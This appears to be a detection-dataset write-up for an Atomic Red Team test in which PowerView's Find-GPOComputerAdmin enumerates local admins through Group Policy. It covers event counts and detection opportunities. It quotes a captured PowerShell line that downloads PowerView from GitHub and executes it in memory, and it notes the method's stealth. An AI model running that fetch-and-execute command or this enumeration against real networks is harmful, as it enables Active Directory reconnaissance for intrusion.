# T1069.002-6: Domain Groups — Find Local Admins via Group Policy (PowerView)

## Technique Context

T1069.002 (Domain Groups) with PowerView's `Find-GPOComputerAdmin` takes a different approach to local admin discovery compared to direct SAMR enumeration. Instead of querying each machine's local admin group directly, it queries Group Policy Objects (GPOs) in Active Directory to determine which users and groups have been granted local administrator rights on specific computers through Restricted Groups or Group Policy preferences. This is a stealthier approach — GPO-based enumeration reads from the domain controller via LDAP rather than making SAMR connections to every workstation, generating less lateral traffic.

`Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME` targets the specific computer running the script, querying the GPOs that apply to it to discover who holds admin rights. This is useful for an attacker who wants to enumerate their current host's admin configuration without triggering network-based detection heuristics. Detection focuses on the PowerView download, LDAP queries targeting GPO objects (`objectclass=groupPolicyContainer`), and the function name in process and script block logs.

In the defended version, Defender blocked execution with `STATUS_ACCESS_DENIED`. With Defender disabled, the technique executes fully.

## What This Dataset Contains

Security EID 4688 captures the full command:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose}
```

Same pinned PowerView commit hash as T1069.002-4 and T1069.002-5. The `-ComputerName $env:COMPUTERNAME` argument targets the local machine — ACME-WS06 in this environment. The cleanup PowerShell process with empty command block confirms execution completion.

The Application channel contains one EID 15 event: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON." This is the same test framework Defender state management artifact seen in T1069.002-13 and T1069.002-7.

Sysmon provides 22 events: 14 EID 7 (image load), 3 EID 1 (process create), 3 EID 10 (process access), 1 EID 17 (pipe create), and 1 EID 8 (CreateRemoteThread). The EID 8 CreateRemoteThread event shows `powershell.exe` (PID 4536) creating a thread in `<unknown process>` (PID 1776, NewThreadId 3388) at `StartAddress: 0x00007FF77E8753A0` — the same start address across all five PowerView tests in this batch. This consistent signature is now confirmed across T1069.002-4, -5, -6, -12, and -13.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103), matching all other PowerView tests in this batch.

Compared to the defended version (34 sysmon, 9 security, 41 PowerShell events), this undefended run shows fewer sysmon events (22 vs 34 — the defended run's higher count reflects Defender's monitoring activity), similar security pattern (4 vs 9), and more PowerShell events (96 vs 41), confirming successful PowerView execution.

## What This Dataset Does Not Contain

Network telemetry is absent from samples. `Find-GPOComputerAdmin` performs LDAP queries to the domain controller to retrieve GPO objects and their settings — these queries generate network traffic that is not captured in the Sysmon samples. The actual result of the GPO admin enumeration is not present in any telemetry channel.

The unresolved `<unknown process>` in the EID 8 target limits attribution of the CreateRemoteThread destination.

## Assessment

This dataset rounds out the PowerView batch with the GPO-based approach to local admin discovery. The telemetry profile is essentially identical to T1069.002-4 and T1069.002-5: same command line structure, same EID 8 CreateRemoteThread signature, same PowerShell event volume. The `Find-GPOComputerAdmin` function name is the primary differentiator and is the key detection anchor in the command line and script block logs.

This dataset, combined with the other PowerView tests, enables training on the full family of PowerView local admin discovery functions with consistent underlying signatures.

## Detection Opportunities Present in This Data

1. **EID 4688 / Sysmon EID 1 — `Find-GPOComputerAdmin` in command line**: The function name is PowerView-specific. Combined with `-ComputerName $env:COMPUTERNAME`, it indicates targeted local machine GPO admin discovery.

2. **Sysmon EID 8 — CreateRemoteThread at `0x00007FF77E8753A0` from PowerShell**: Confirmed in all five PowerView tests in this batch. This is the most broadly applicable single-event PowerView indicator across the entire T1069.002 PowerView subset.

3. **Pinned commit hash in download URL**: The hash `f94a5d298a1b4c5dfb1f30a246d9c73d13b22888` appears in T1069.002-4, -5, and -6 (the three tests from this commit). This specific hash in a PowerSploit GitHub URL is a precise IOC for this PowerView release.

4. **GPO-related LDAP queries from workstation**: `Find-GPOComputerAdmin` queries AD for `objectclass=groupPolicyContainer` objects and Group Policy preferences. LDAP traffic from a workstation targeting these AD object types is anomalous outside of Group Policy management contexts.

5. **Application EID 15 (Defender state) as temporal context marker**: The Defender state change event at the start of specific tests (T1069.002-6, T1069.002-7, T1069.002-13) can serve as a temporal anchor for correlating nearby attack technique events in analysis of sequential ART batch runs.
